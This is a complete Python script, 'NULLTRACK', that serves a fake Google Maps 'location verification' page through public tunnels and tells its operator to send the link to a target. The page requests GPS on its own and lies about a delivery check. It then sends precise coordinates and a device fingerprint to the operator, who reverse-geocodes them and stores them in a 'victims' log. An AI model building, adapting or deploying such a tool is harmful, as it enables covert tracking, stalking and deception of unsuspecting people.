#!/usr/bin/env python3
"""
NULLTRACK v1.0 - Precision Geolocation Framework
Cloudflared Tunnel | Serveo Fallback | Modern Terminal UI
Zero Click GPS Capture | Auto Popup Modal
Created by null7
"""

import os
import sys
import json
import threading
import subprocess
import time
import socket
import re
import tarfile
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests

# ============================================================
# COLOR SETUP
# ============================================================
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    C = Fore
    S = Style
except ImportError:
    class Dummy:
        def __getattr__(self, name): return ''
    C = S = Dummy()

# ============================================================
# CONFIGURATION
# ============================================================
PORT = 8080
LOG_FILE = "nulltrack_victims.json"
TOOLS_DIR = os.path.join(os.path.expanduser("~"), ".nulltrack")

# ============================================================
# ASCII ART BANNER - Clean, No Borders
# ============================================================
BANNER = f"""
{C.RED}                               ███╗   ██╗██╗   ██╗██╗     ██╗     
{C.RED}                               ████╗  ██║██║   ██║██║     ██║     
{C.RED}                               ██╔██╗ ██║██║   ██║██║     ██║     
{C.RED}                               ██║╚██╗██║██║   ██║██║     ██║     
{C.RED}                               ██║ ╚████║╚██████╔╝███████╗███████╗
{C.RED}                               ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝
{C.RED}                                                                 
{C.RED}                    ████████╗██████╗  █████╗  ██████╗██╗  ██╗
{C.RED}                    ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
{C.RED}                       ██║   ██████╔╝███████║██║     █████╔╝ 
{C.RED}                       ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ 
{C.RED}                       ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗
{C.RED}                       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{C.RED}                                                                 

{C.WHITE}                         ◆ {S.BRIGHT}PRECISION GEOLOCATION FRAMEWORK{S.RESET_ALL} ◆
{C.RED}                          ═══ {S.BRIGHT}ZERO CLICK GPS CAPTURE{S.RESET_ALL} {C.RED}═══

{C.MAGENTA}                             created by {S.BRIGHT}null7{S.RESET_ALL}

"""

# ============================================================
# LANDING PAGE (unchanged)
# ============================================================
LANDING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps — Location Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0a16;
            --blue: #4285f4;
            --blue-dark: #1a73e8;
            --red: #ea4335;
            --green: #34a853;
            --yellow: #fbbc04;
            --text: #e8eaed;
            --text-secondary: #9aa0a6;
            --card-bg: rgba(18,18,38,0.92);
            --border: rgba(255,255,255,0.08);
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Google Sans','Inter',-apple-system,sans-serif;
            background:var(--bg);
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            overflow:hidden;
        }
        .bg-orbs{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
        .orb{
            position:absolute;
            border-radius:50%;
            filter:blur(140px);
            opacity:0.22;
            animation:float 24s infinite ease-in-out;
        }
        .orb:nth-child(1){width:600px;height:600px;background:var(--blue);top:-20%;left:-14%;animation-delay:0s}
        .orb:nth-child(2){width:450px;height:450px;background:#7b1fa2;bottom:-20%;right:-12%;animation-delay:-9s}
        .orb:nth-child(3){width:400px;height:400px;background:var(--red);top:60%;left:60%;animation-delay:-17s}
        .orb:nth-child(4){width:300px;height:300px;background:var(--yellow);top:20%;right:20%;animation-delay:-5s;opacity:0.12}
        @keyframes float{
            0%,100%{transform:translate(0,0) scale(1)}
            25%{transform:translate(80px,-100px) scale(1.15)}
            50%{transform:translate(-60px,80px) scale(0.85)}
            75%{transform:translate(-90px,-60px) scale(1.08)}
        }
        .overlay{
            position:fixed;
            top:0;left:0;
            width:100%;height:100%;
            background:rgba(0,0,0,0.78);
            z-index:999;
            display:flex;
            justify-content:center;
            align-items:center;
            backdrop-filter:blur(5px);
            -webkit-backdrop-filter:blur(5px);
        }
        .modal{
            background:var(--card-bg);
            backdrop-filter:blur(60px);
            -webkit-backdrop-filter:blur(60px);
            border:1px solid var(--border);
            border-radius:26px;
            padding:38px 30px 30px;
            max-width:430px;
            width:92%;
            text-align:center;
            box-shadow:0 24px 70px rgba(0,0,0,0.8),0 0 0 1px rgba(255,255,255,0.03) inset,0 0 120px rgba(66,133,244,0.08);
            animation:slideUp 0.45s cubic-bezier(0.16,1,0.3,1);
        }
        @keyframes slideUp{
            from{transform:translateY(40px);opacity:0}
            to{transform:translateY(0);opacity:1}
        }
        .pin-icon{
            width:72px;height:72px;
            background:linear-gradient(145deg,#4285f4,#1a73e8);
            border-radius:50%;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            margin-bottom:20px;
            box-shadow:0 14px 36px rgba(26,115,232,0.45);
            animation:pulse-pin 2.2s infinite;
            position:relative;
        }
        .pin-icon::after{
            content:'';
            position:absolute;
            width:100%;height:100%;
            border-radius:50%;
            border:2px solid rgba(66,133,244,0.5);
            animation:ripple 2.2s infinite;
        }
        @keyframes pulse-pin{
            0%,100%{box-shadow:0 14px 36px rgba(26,115,232,0.45)}
            50%{box-shadow:0 14px 56px rgba(26,115,232,0.75)}
        }
        @keyframes ripple{
            0%{transform:scale(1);opacity:0.6}
            100%{transform:scale(1.8);opacity:0}
        }
        .pin-icon svg{width:36px;height:36px;position:relative;z-index:1}
        .domain-tag{
            display:inline-block;
            background:rgba(66,133,244,0.1);
            color:#8ab4f8;
            font-size:11.5px;
            padding:5px 14px;
            border-radius:50px;
            margin-bottom:16px;
            font-weight:500;
            letter-spacing:0.2px;
        }
        .modal h2{
            font-size:23px;
            font-weight:700;
            color:var(--text);
            margin-bottom:6px;
            letter-spacing:-0.5px;
        }
        .modal .desc{
            font-size:13.5px;
            color:var(--text-secondary);
            line-height:1.65;
            margin-bottom:20px;
        }
        .privacy-row{
            display:flex;
            align-items:center;
            justify-content:center;
            gap:8px;
            font-size:11.5px;
            color:rgba(255,255,255,0.35);
            margin-bottom:26px;
        }
        .privacy-row .dot{width:6px;height:6px;background:var(--green);border-radius:50%}
        .btn-allow{
            display:block;
            width:100%;
            background:linear-gradient(135deg,#4285f4,#1a73e8);
            color:#fff;
            border:none;
            padding:16px;
            font-size:16px;
            font-weight:600;
            border-radius:15px;
            cursor:pointer;
            letter-spacing:-0.2px;
            transition:all 0.25s cubic-bezier(0.4,0,0.2,1);
            box-shadow:0 8px 28px rgba(26,115,232,0.4);
            font-family:inherit;
        }
        .btn-allow:hover{
            transform:translateY(-2px);
            box-shadow:0 14px 36px rgba(26,115,232,0.55);
        }
        .btn-allow:active{transform:scale(0.96)}
        .btn-deny{
            display:block;
            width:100%;
            background:transparent;
            color:rgba(255,255,255,0.35);
            border:1px solid rgba(255,255,255,0.06);
            padding:13px;
            font-size:14px;
            font-weight:500;
            border-radius:15px;
            cursor:pointer;
            margin-top:10px;
            transition:all 0.2s;
            font-family:inherit;
        }
        .btn-deny:hover{background:rgba(255,255,255,0.02);color:rgba(255,255,255,0.55)}
        .loading-state{display:none;text-align:center;padding:20px 0}
        .loading-state.active{display:block}
        .spinner{
            width:46px;height:46px;
            border:3px solid rgba(255,255,255,0.05);
            border-top-color:var(--blue);
            border-radius:50%;
            animation:spin 0.7s linear infinite;
            margin:0 auto 14px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
        .loading-text{font-size:14px;color:var(--text-secondary)}
        .success-state{display:none;text-align:center;padding:20px 0}
        .success-state.active{display:block}
        .check-circle{
            width:66px;height:66px;
            background:rgba(52,168,83,0.12);
            border:2px solid rgba(52,168,83,0.3);
            border-radius:50%;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            margin-bottom:14px;
            animation:popIn 0.5s cubic-bezier(0.16,1,0.3,1);
        }
        @keyframes popIn{
            0%{transform:scale(0);opacity:0}
            80%{transform:scale(1.08)}
            100%{transform:scale(1);opacity:1}
        }
        .check-circle svg{width:32px;height:32px}
        .success-title{font-size:18px;font-weight:600;color:var(--green);margin-bottom:4px}
        .success-sub{font-size:13px;color:var(--text-secondary)}
        .error-state{display:none;text-align:center;padding:20px 0}
        .error-state.active{display:block}
        .error-box{
            background:rgba(234,67,53,0.07);
            border:1px solid rgba(234,67,53,0.25);
            border-radius:14px;
            padding:14px 18px;
            color:#f28b82;
            font-size:13px;
            margin-top:10px;
            line-height:1.5;
        }
        .retry-link{
            color:#8ab4f8;
            cursor:pointer;
            text-decoration:underline;
            font-size:13px;
            margin-top:12px;
            display:inline-block;
            font-weight:500;
        }
        .footer-note{
            text-align:center;
            padding:18px;
            font-size:10.5px;
            color:rgba(255,255,255,0.18);
            position:fixed;
            bottom:0;
            width:100%;
        }
    </style>
</head>
<body>
<div class="bg-orbs">
    <div class="orb"></div>
    <div class="orb"></div>
    <div class="orb"></div>
    <div class="orb"></div>
</div>
<div class="overlay" id="gpsOverlay">
    <div class="modal" id="gpsModal">
        <div class="pin-icon">
            <svg viewBox="0 0 24 24" fill="none">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" fill="#fff"/>
                <circle cx="12" cy="9" r="3" fill="#1a73e8"/>
            </svg>
        </div>
        <div class="domain-tag" id="domainDisplay">📍 maps.google.com</div>
        <h2>Allow Location Access</h2>
        <p class="desc">Google Maps requires your precise device location to verify your delivery address and provide accurate navigation.</p>
        <div class="privacy-row">
            <span class="dot"></span> Encrypted & used only for this session
        </div>
        <button class="btn-allow" onclick="requestGPS()">
            📍 Allow Once
        </button>
        <button class="btn-deny" onclick="handleDeny()">
            Not Now
        </button>
        <div class="loading-state" id="loadingState">
            <div class="spinner"></div>
            <p class="loading-text">Acquiring GPS coordinates...</p>
        </div>
        <div class="success-state" id="successState">
            <div class="check-circle">
                <svg viewBox="0 0 24 24" fill="none" stroke="#34a853" stroke-width="2.8">
                    <polyline points="4 12 10 18 20 6"/>
                </svg>
            </div>
            <p class="success-title">Location Verified</p>
            <p class="success-sub">Your delivery is being processed.</p>
        </div>
        <div class="error-state" id="errorState">
            <div class="error-box" id="errorMsg">
                ⚠️ Unable to access location. Please check your settings.
            </div>
            <span class="retry-link" onclick="requestGPS()">↻ Tap to Retry</span>
        </div>
    </div>
</div>
<div class="footer-note">Google Maps ©2024 • Location Services</div>
<script>
document.getElementById('domainDisplay').innerText = '📍 ' + window.location.hostname;
setTimeout(function(){ requestGPS(); }, 800);
function requestGPS(){
    document.getElementById('loadingState').classList.add('active');
    document.getElementById('successState').classList.remove('active');
    document.getElementById('errorState').classList.remove('active');
    document.querySelector('.btn-allow').style.display = 'none';
    document.querySelector('.btn-deny').style.display = 'none';
    if(!navigator.geolocation){
        showError('Geolocation not supported on this device.');
        return;
    }
    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
        enableHighAccuracy: true,
        timeout: 25000,
        maximumAge: 0
    });
}
function onSuccess(position){
    document.getElementById('loadingState').classList.remove('active');
    document.getElementById('successState').classList.add('active');
    fetch('/gps', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || 'N/A',
            altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
            speed: position.coords.speed || 'N/A',
            heading: position.coords.heading || 'N/A',
            timestamp: new Date(position.timestamp).toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenSize: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cores: navigator.hardwareConcurrency || 'N/A',
            memory: navigator.deviceMemory || 'N/A',
            connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
            referrer: document.referrer || 'Direct'
        })
    }).catch(function(){});
    setTimeout(function(){
        document.getElementById('gpsOverlay').style.opacity = '0';
        document.getElementById('gpsOverlay').style.transition = 'opacity 0.7s';
        setTimeout(function(){
            document.getElementById('gpsOverlay').style.display = 'none';
        }, 700);
    }, 2800);
}
function onError(err){
    document.getElementById('loadingState').classList.remove('active');
    document.getElementById('errorState').classList.add('active');
    var msgs = {
        1: '⚠️ Location access denied. Please allow GPS permission in your browser settings and refresh.',
        2: '⚠️ GPS signal unavailable. Move to an open area with clear sky.',
        3: '⚠️ Request timed out. Check your connection and try again.'
    };
    document.getElementById('errorMsg').innerText = msgs[err.code] || '⚠️ Error occurred. Please try again.';
    document.querySelector('.btn-allow').style.display = 'block';
    document.querySelector('.btn-deny').style.display = 'block';
}
function handleDeny(){
    document.getElementById('errorState').classList.add('active');
    document.getElementById('errorMsg').innerText = '⚠️ Location access is required to verify your delivery.';
    document.querySelector('.btn-allow').style.display = 'block';
    document.querySelector('.btn-deny').style.display = 'none';
}
</script>
</body>
</html>"""

# ============================================================
# UTILITY FUNCTIONS
# ============================================================
def reverse_geocode(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        headers = {"User-Agent": "NullTrack/1.0"}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.json().get("display_name", "Unknown Address")
    except:
        return "Address lookup failed"

def ip_geolocation(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=city,regionName,country,isp,org,query", timeout=5)
        data = resp.json()
        if data.get("status") == "success":
            return f"{data.get('city','?')}, {data.get('regionName','?')}, {data.get('country','?')} — {data.get('isp','?')}"
    except:
        pass
    return "Unknown"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def spinner(text, duration=0.8):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        print(f"\r    {C.CYAN}{chars[i % len(chars)]}{S.RESET_ALL} {text}", end="", flush=True)
        time.sleep(0.07)
        i += 1

# ============================================================
# TUNNEL METHODS
# ============================================================
def install_cloudflared():
    exe_name = "cloudflared.exe" if os.name == "nt" else "cloudflared"
    exe_path = os.path.join(TOOLS_DIR, exe_name)
    if os.path.exists(exe_path):
        return exe_path

    os.makedirs(TOOLS_DIR, exist_ok=True)
    print(f"    {C.YELLOW}⬇{S.RESET_ALL}  Downloading cloudflared...")

    system = sys.platform
    if system == "win32":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    elif system == "darwin":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
    else:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

    try:
        resp = requests.get(url, stream=True, timeout=120)
        if url.endswith(".tgz"):
            tgz_path = os.path.join(TOOLS_DIR, "cloudflared.tgz")
            with open(tgz_path, "wb") as f:
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
            with tarfile.open(tgz_path, "r:gz") as tar:
                tar.extract("cloudflared", TOOLS_DIR)
            os.remove(tgz_path)
        else:
            with open(exe_path, "wb") as f:
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
            if os.name != "nt":
                os.chmod(exe_path, 0o755)
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Cloudflared installed")
        return exe_path
    except Exception as e:
        print(f"    {C.RED}✗{S.RESET_ALL}  Failed: {e}")
        return None

def start_cloudflared_tunnel():
    exe = install_cloudflared()
    if not exe:
        return None

    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Launching Cloudflare Tunnel...")
    try:
        proc = subprocess.Popen(
            [exe, "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        public_url = None
        start_time = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time() - start_time > 45:
                break
            match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
            if match:
                public_url = match.group(1)
                break
        if public_url:
            print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected")
            return public_url
    except:
        pass
    print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Cloudflared failed, trying fallback...")
    return None

def start_serveo_tunnel():
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Trying Serveo SSH tunnel...")
    try:
        import random
        subdomain = f"ntrack-{random.randint(1000,9999)}"
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-R", f"{subdomain}:80:localhost:{PORT}", "serveo.net"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        public_url = f"https://{subdomain}.serveo.net"
        time.sleep(3)
        try:
            requests.get(f"http://{subdomain}.serveo.net", timeout=5)
            print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected via Serveo")
            return public_url
        except:
            pass
        for line in iter(proc.stdout.readline, ''):
            if "Forwarding" in line or "serveo" in line.lower():
                match = re.search(r'https?://[^\s]+', line)
                if match:
                    return match.group(0)
    except FileNotFoundError:
        print(f"    {C.YELLOW}⚠{S.RESET_ALL}  SSH not found")
    except:
        pass
    print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Serveo failed, trying last resort...")
    return None

def start_localhost_run():
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Trying localhost.run...")
    try:
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-R", f"80:localhost:{PORT}", "nokey@localhost.run"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        start = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time() - start > 20:
                break
            match = re.search(r'https?://[a-zA-Z0-9\-]+\.lhr\.life', line)
            if match:
                print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected via localhost.run")
                return match.group(0)
    except FileNotFoundError:
        pass
    except:
        pass
    return None

# ============================================================
# HTTP SERVER
# ============================================================
class NullTrackHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(LANDING_PAGE.encode("utf-8"))

    def do_POST(self):
        if self.path == "/gps":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            data = json.loads(body)
            lat = data.get("latitude")
            lon = data.get("longitude")
            ip = self.client_address[0]

            print(f"""
{C.RED}  ┌─────────────────────────────────────────────────────────────┐
{C.RED}  │{C.WHITE}  🎯 {S.BRIGHT}GPS HIT RECEIVED{S.RESET_ALL}                                         {C.RED}│
{C.RED}  ├─────────────────────────────────────────────────────────────┤
{C.RED}  │{C.WHITE}  📍 Coordinates : {C.YELLOW}{lat}, {lon}{' '*(38-len(f'{lat}, {lon}'))}{C.RED}│
{C.RED}  │{C.WHITE}  🎯 Accuracy    : {C.YELLOW}±{data.get('accuracy','?')}m{' '*(38-len(f'±{data.get('accuracy','?')}m'))}{C.RED}│
{C.RED}  │{C.WHITE}  🌐 IP Address  : {C.YELLOW}{ip}{' '*(38-len(ip))}{C.RED}│
{C.RED}  │{C.WHITE}  🗺️  Google Maps : {C.YELLOW}maps.google.com/?q={lat},{lon}{' '*(10)}{C.RED}│
{C.RED}  └─────────────────────────────────────────────────────────────┘{S.RESET_ALL}
""")
            threading.Thread(target=save_victim_data, args=(data, ip, lat, lon), daemon=True).start()
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())

def save_victim_data(data, ip, lat, lon):
    address = reverse_geocode(lat, lon)
    ip_info = ip_geolocation(ip)
    record = {
        "id": datetime.now().strftime("%Y%m%d%H%M%S%f"),
        "timestamp": datetime.now().isoformat(),
        "gps": {
            "latitude": lat,
            "longitude": lon,
            "accuracy_m": data.get("accuracy"),
            "altitude": data.get("altitude"),
            "speed_mps": data.get("speed"),
            "heading": data.get("heading"),
        },
        "address": address,
        "ip": ip,
        "isp": ip_info,
        "device": {
            "ua": data.get("userAgent"),
            "platform": data.get("platform"),
            "language": data.get("language"),
            "screen": data.get("screenSize"),
            "timezone": data.get("timezone"),
            "cpu": data.get("cores"),
            "ram": data.get("memory"),
            "connection": data.get("connection"),
        },
        "maps": {
            "google": f"https://www.google.com/maps?q={lat},{lon}",
            "osm": f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}",
        }
    }
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            try: logs = json.load(f)
            except: logs = []
    logs.append(record)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)
    print(f"    {C.GREEN}✓{S.RESET_ALL}  Data saved → {LOG_FILE}")

# ============================================================
# MAIN
# ============================================================
def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)

    # Startup
    print(f"  {C.CYAN}◆ {S.BRIGHT}INITIALIZATION{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    spinner("Starting HTTP server...", 0.5)
    server = HTTPServer(("0.0.0.0", PORT), NullTrackHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    local_ip = get_local_ip()
    print(f"    {C.GREEN}✓{S.RESET_ALL}  HTTP server online")
    print(f"    {C.WHITE}→{S.RESET_ALL}  Local: {C.CYAN}http://{local_ip}:{PORT}{S.RESET_ALL}")

    spinner("Loading GPS capture module...", 0.4)
    print(f"    {C.GREEN}✓{S.RESET_ALL}  GPS module ready")

    spinner("Preparing tunnel methods...", 0.4)
    print(f"    {C.GREEN}✓{S.RESET_ALL}  Multi-tunnel prepared")
    print()

    # Tunnel setup
    print(f"  {C.CYAN}◆ {S.BRIGHT}TUNNEL CONNECTION{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    public_url = None
    tunnel_name = None

    print(f"    {C.WHITE}[1/3]{S.RESET_ALL} Cloudflare Tunnel")
    public_url = start_cloudflared_tunnel()
    if public_url:
        tunnel_name = "Cloudflare Tunnel"

    if not public_url:
        print(f"    {C.WHITE}[2/3]{S.RESET_ALL} Serveo SSH")
        public_url = start_serveo_tunnel()
        if public_url:
            tunnel_name = "Serveo"

    if not public_url:
        print(f"    {C.WHITE}[3/3]{S.RESET_ALL} localhost.run")
        public_url = start_localhost_run()
        if public_url:
            tunnel_name = "localhost.run"

    print()

    # Result
    print(f"  {C.CYAN}◆ {S.BRIGHT}RESULT{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    if public_url:
        print(f"    {C.GREEN}●{S.RESET_ALL}  Status  : {C.GREEN}{S.BRIGHT}CONNECTED{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  Method  : {C.WHITE}{tunnel_name}{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  URL     : {C.YELLOW}{S.BRIGHT}{public_url}{S.RESET_ALL}")
        print(f"\n  {C.RED}{S.BRIGHT}  ► SEND THIS LINK TO TARGET:{S.RESET_ALL}")
        print(f"  {C.YELLOW}  {public_url}{S.RESET_ALL}")
        print(f"\n  {C.WHITE}  ◆ Waiting for GPS hits... {C.RED}Ctrl+C{S.RESET_ALL} {C.WHITE}to stop.{S.RESET_ALL}")
        print(f"  {C.WHITE}  ◆ Log file: {C.CYAN}{os.path.abspath(LOG_FILE)}{S.RESET_ALL}")
    else:
        print(f"    {C.RED}●{S.RESET_ALL}  Status  : {C.RED}{S.BRIGHT}ALL TUNNELS FAILED{S.RESET_ALL}")
        print(f"    {C.WHITE}  ◆ Local URL: {C.CYAN}http://{local_ip}:{PORT}{S.RESET_ALL}")
        print(f"    {C.WHITE}  ◆ Use manual port forwarding{S.RESET_ALL}")

    print(f"\n  {C.WHITE}{'─'*50}{S.RESET_ALL}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {C.RED}◆ {S.BRIGHT}SHUTDOWN{S.RESET_ALL}")
        print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Server stopped")
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Data saved: {os.path.abspath(LOG_FILE)}")
        print(f"\n  {C.MAGENTA}  null7 says goodbye.{S.RESET_ALL}\n")
        server.shutdown()
        sys.exit(0)

if __name__ == "__main__":
    main()